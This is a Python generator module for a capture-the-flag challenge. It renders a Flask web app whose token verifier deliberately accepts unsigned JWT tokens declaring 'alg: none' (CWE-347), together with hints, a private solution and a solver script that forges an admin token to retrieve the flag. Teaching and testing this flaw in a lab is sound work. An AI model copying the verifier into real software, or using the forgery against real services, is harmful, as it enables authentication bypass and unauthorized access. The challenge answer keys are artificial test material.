"""Deterministic renderer for the ``crypto_token_forgery`` challenge family.

A web app issues signed session tokens for a lightweight admin console. The
token verifier honors a legacy "alg: none" debug path that was never removed,
so a token whose header declares ``alg: none`` is accepted with **no**
signature check at all (CWE-347: improper verification of a cryptographic
signature -- classic JWT "alg confusion" / "none algorithm" bypass).

RED mode: the player logs in as a low-privilege demo user, observes the
token shape, forges an unsigned admin token, and reads the flag off a
protected admin route.

This module is intentionally standalone: it must NOT import ``families``
(which imports it) to avoid a circular import. It exports the fixed
renderer-module interface that ``families.py`` wires up in a later step.
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from typing import TYPE_CHECKING

from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml

if TYPE_CHECKING:
    from ctf_generator.cve_source import CveRecord

# --- Renderer-module interface (see families.py FamilyRenderer contract) -----

FAMILY_NAME = "crypto_token_forgery"
CATEGORY = "crypto"
MODES: tuple[str, ...] = ("red",)
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "A web console issues HMAC-signed session tokens but its verifier still "
    "honors a legacy 'alg: none' debug path, so a player who forges an "
    "unsigned admin token bypasses signature verification entirely (CWE-347) "
    "to reach a protected admin endpoint holding the flag."
)
COMPOSE_MARKERS: tuple[str, ...] = ("api:",)
SCORING_HINTS: dict[str, object] = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": True,
    "decoy_density": "medium",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "docker-compose.yml",
    "services/api/Dockerfile",
    "services/api/requirements.txt",
    "services/api/app.py",
    "public/description.md",
    "public/hints.yaml",
    "private/solution.md",
    "private/solver.py",
    "private/variant.json",
    "private/checkpoints.yaml",
    "tests/healthcheck.py",
)


@dataclass(frozen=True)
class Variant:
    login_noun: str
    admin_noun: str
    whoami_noun: str
    issuer: str
    demo_user: str
    demo_password: str
    admin_user: str
    secret: str
    flag: str


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    variant = _variant(rng)
    login_route = f"/api/{variant.login_noun}"
    whoami_route = f"/api/{variant.whoami_noun}"
    admin_route = f"/api/admin/{variant.admin_noun}"

    public_hints = [
        {
            "level": 1,
            "text": (
                "Log in and inspect the token you get back. It has the "
                "familiar three dot-separated segments of a signed token."
            ),
        },
        {
            "level": 2,
            "text": (
                "Decode the header segment (base64url). What field controls "
                "which signing algorithm the server trusts, and what happens "
                "if you change it?"
            ),
        },
        {
            "level": 3,
            "text": (
                f"The verifier still accepts an 'alg: none' legacy debug "
                f"token with an empty signature segment. Forge a payload "
                f"claiming the '{variant.admin_user}' identity and role "
                f"'admin', then call {admin_route}."
            ),
        },
    ]

    files = {
        "docker-compose.yml": _compose(),
        "services/api/Dockerfile": _dockerfile(),
        "services/api/requirements.txt": "flask==3.0.3\n",
        "services/api/app.py": _api_app(variant, login_route, whoami_route, admin_route),
        "public/description.md": _description(
            spec, variant, login_route, whoami_route, admin_route, cve_record
        ),
        "public/hints.yaml": dump_yaml({"hints": public_hints}),
        "private/solution.md": _solution(variant, login_route, whoami_route, admin_route),
        "private/solver.py": _solver(variant, login_route, admin_route),
        "private/variant.json": _variant_json(spec, variant, login_route, whoami_route, admin_route),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "tests/healthcheck.py": _healthcheck(),
    }
    return files


def _variant(rng: random.Random) -> Variant:
    login_noun = rng.choice(["login", "session", "auth", "signin"])
    admin_noun = rng.choice(["reports", "dashboard", "console", "ledger"])
    whoami_noun = rng.choice(["whoami", "profile", "me"])
    issuer = rng.choice(["Northwind Portal", "Aurora Ops", "Cobalt Suite", "Vantage Console"])
    demo_user = rng.choice(["guest", "intern", "analyst", "viewer"])
    demo_password = (
        f"{rng.choice(['Spring', 'River', 'Delta', 'Ember'])}{rng.randrange(100, 999)}!"
    )
    admin_user = rng.choice(["root_admin", "sysadmin", "superuser", "admin_ops"])
    secret = _token_hex(rng, 16)
    flag = f"ctf{{jwt_none_alg_{_token_hex(rng, 6)}}}"
    return Variant(
        login_noun=login_noun,
        admin_noun=admin_noun,
        whoami_noun=whoami_noun,
        issuer=issuer,
        demo_user=demo_user,
        demo_password=demo_password,
        admin_user=admin_user,
        secret=secret,
        flag=flag,
    )


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _variant_json(
    spec: ChallengeSpec, v: Variant, login_route: str, whoami_route: str, admin_route: str
) -> str:
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": FAMILY_NAME,
            "flag": v.flag,
            "routes": {
                "health": "/healthz",
                "login": login_route,
                "whoami": whoami_route,
                "admin": admin_route,
            },
            "credentials": {
                "demo_user": v.demo_user,
                "demo_password": v.demo_password,
                "admin_user": v.admin_user,
            },
            "token": {
                "issuer": v.issuer,
                "secret": v.secret,
                "vulnerability": "alg=none signature-check bypass (CWE-347)",
            },
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


def _compose() -> str:
    return """services:
  api:
    build: ./services/api
    environment:
      CTFGEN_FLAG: ${CTFGEN_FLAG:-}
      TOKEN_SECRET: ${TOKEN_SECRET:-}
    ports:
      - "8080:8080"
    networks: [frontend]
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

networks:
  frontend:
"""


def _dockerfile() -> str:
    return """FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "app.py"]
"""


def _api_app(v: Variant, login_route: str, whoami_route: str, admin_route: str) -> str:
    return f'''from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import time

from flask import Flask, jsonify, request

app = Flask(__name__)

FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"
SECRET = os.environ.get("TOKEN_SECRET") or "{v.secret}"
ISSUER = "{v.issuer}"

USERS = {{
    "{v.demo_user}": {{"password": "{v.demo_password}", "role": "user"}},
    # No self-service login exists for the admin account; its password is
    # rotated out-of-band by ops and is not present anywhere in this service.
    "{v.admin_user}": {{"password": None, "role": "admin"}},
}}


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(text: str) -> bytes:
    padding = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + padding)


def issue_token(username: str, role: str) -> str:
    header = {{"alg": "HS256", "typ": "JWT"}}
    payload = {{
        "sub": username,
        "role": role,
        "iss": ISSUER,
        "iat": int(time.time()),
    }}
    header_seg = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_seg = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{{header_seg}}.{{payload_seg}}".encode("ascii")
    signature = hmac.new(SECRET.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_seg = _b64url_encode(signature)
    return f"{{header_seg}}.{{payload_seg}}.{{sig_seg}}"


def decode_token(token: str):
    """Return the payload dict for a structurally valid token, else None.

    VULNERABILITY (CWE-347): tokens whose header declares alg "none" are
    accepted with NO signature check at all -- a legacy compatibility path
    for old debug tooling that predates the current auth stack and was
    never removed.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header_seg, payload_seg, sig_seg = parts
    try:
        header = json.loads(_b64url_decode(header_seg))
        payload = json.loads(_b64url_decode(payload_seg))
    except Exception:
        return None

    alg = str(header.get("alg", "")).lower()
    if alg == "none":
        return payload

    if alg != "hs256":
        return None

    signing_input = f"{{header_seg}}.{{payload_seg}}".encode("ascii")
    expected = hmac.new(SECRET.encode("utf-8"), signing_input, hashlib.sha256).digest()
    try:
        actual = _b64url_decode(sig_seg)
    except Exception:
        return None
    if not hmac.compare_digest(expected, actual):
        return None
    return payload


def current_payload():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None
    return decode_token(auth[len("Bearer "):].strip())


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "api"}}


@app.post("{login_route}")
def login():
    body = request.get_json(force=True, silent=True) or {{}}
    username = str(body.get("username", ""))
    password = str(body.get("password", ""))
    user = USERS.get(username)
    if user is None or user["password"] is None or user["password"] != password:
        return jsonify({{"error": "invalid credentials"}}), 401
    token = issue_token(username, user["role"])
    return jsonify({{"token": token, "role": user["role"]}})


@app.get("{whoami_route}")
def whoami():
    payload = current_payload()
    if payload is None:
        return jsonify({{"error": "unauthenticated"}}), 401
    return jsonify({{"sub": payload.get("sub"), "role": payload.get("role")}})


@app.get("{admin_route}")
def admin_panel():
    payload = current_payload()
    if payload is None or payload.get("role") != "admin":
        return jsonify({{"error": "forbidden"}}), 403
    return jsonify({{"panel": f"{{ISSUER}} admin console", "flag": FLAG}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
'''


def _description(
    spec: ChallengeSpec,
    v: Variant,
    login_route: str,
    whoami_route: str,
    admin_route: str,
    cve_record: "CveRecord | None",
) -> str:
    cve_note = ""
    if cve_record is not None:
        cve_note = (
            f"\nThis challenge is themed after the broader class of "
            f"cryptographic-verification failures illustrated by "
            f"{cve_record.cve_id} ({cve_record.cvss_severity.title()}, "
            f"{', '.join(cve_record.cwe_ids) or 'unclassified CWE'}): "
            f"{cve_record.description}\n"
        )
    return f"""# {spec.title}

You have access to the `{v.issuer}` admin console API as a low-privilege
demo account.

Credentials:

- `POST {login_route}` with `{{"username": "{v.demo_user}", "password": "{v.demo_password}"}}`

The login response includes a session token. Somewhere in how that token is
verified, the server trusts more than it should. Your goal is to reach the
admin-only endpoint and recover the flag -- without ever knowing the admin
account's password.

Useful routes:

- `GET /healthz`
- `POST {login_route}`
- `GET {whoami_route}` (send `Authorization: Bearer <token>`)
- `GET {admin_route}` (admin-only)

The flag format is `ctf{{...}}`.
{cve_note}
This challenge is generated as a crypto variant. The exact route names,
usernames, issuer name, and token secret differ across generated instances.
"""


def _solution(v: Variant, login_route: str, whoami_route: str, admin_route: str) -> str:
    return f"""# Private Solution

The token verifier is a hand-rolled JWT-style implementation. It correctly
HMAC-signs and checks `alg: HS256` tokens, but it also keeps a legacy
compatibility branch: any token whose header declares `"alg": "none"` is
accepted as-is, with **no signature check performed at all**
(CWE-347: improper verification of a cryptographic signature).

Solve path:

1. `POST {login_route}` with `{{"username": "{v.demo_user}", "password": "{v.demo_password}"}}`
   and capture the returned token.
2. Base64url-decode the token's header and payload segments (the parts
   before and after the middle `.`).
3. Rewrite the header to `{{"alg": "none", "typ": "JWT"}}`.
4. Rewrite the payload's `sub` to `"{v.admin_user}"` and `role` to
   `"admin"`.
5. Re-encode both segments as base64url and join them with a **trailing
   empty signature segment**: `<header>.<payload>.`
6. `GET {admin_route}` with `Authorization: Bearer <forged token>` and read
   the flag out of the JSON response.

This is meant to teach that a token's algorithm/type must never be trusted
from attacker-controlled header data -- the verifier must pin the expected
algorithm server-side, not read it out of the token being verified.
"""


def _solver(v: Variant, login_route: str, admin_route: str) -> str:
    return f'''from __future__ import annotations

import argparse
import base64
import json
import re
import sys
from urllib import request


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(text: str) -> bytes:
    padding = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + padding)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--username", default="{v.demo_user}")
    parser.add_argument("--password", default="{v.demo_password}")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    def post_json(path, payload):
        req = request.Request(
            base + path,
            data=json.dumps(payload).encode("utf-8"),
            headers={{"Content-Type": "application/json"}},
            method="POST",
        )
        with request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode("utf-8"))

    def get(path, headers=None):
        req = request.Request(base + path, headers=headers or {{}})
        with request.urlopen(req, timeout=5) as response:
            return response.read().decode("utf-8")

    login = post_json("{login_route}", {{"username": args.username, "password": args.password}})
    token = login["token"]

    header_seg, payload_seg, _sig_seg = token.split(".")
    payload = json.loads(_b64url_decode(payload_seg))

    forged_header = _b64url_encode(
        json.dumps({{"alg": "none", "typ": "JWT"}}, separators=(",", ":")).encode("utf-8")
    )
    payload["sub"] = "{v.admin_user}"
    payload["role"] = "admin"
    forged_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    forged_token = f"{{forged_header}}.{{forged_payload}}."

    body = get("{admin_route}", headers={{"Authorization": f"Bearer {{forged_token}}"}})
    match = re.search(r"ctf\\{{[^}}]+\\}}", body)
    if not match:
        raise RuntimeError("flag not found")
    print(match.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    with request.urlopen(args.base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''
